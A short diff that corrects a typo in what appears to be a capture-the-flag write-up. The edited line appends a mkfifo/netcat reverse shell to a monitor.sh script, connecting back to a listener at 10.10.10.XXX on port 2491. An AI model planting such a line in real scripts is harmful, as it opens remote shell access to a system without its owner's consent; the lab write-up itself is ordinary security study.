@@ -78,7 +78,7 @@ To de-zip, or execute files you always have to call the `shell` first.
 
 After that I did set up a nc listener on post 2491 and added following command into the monitor.sh file.
 
-`echp "rm/tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.XXX 2491 >/tmp/f" >> monitor.sh`
+`echo "rm/tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.XXX 2491 >/tmp/f" >> monitor.sh`
 
 Thank you for that command @sicurolab.´
 
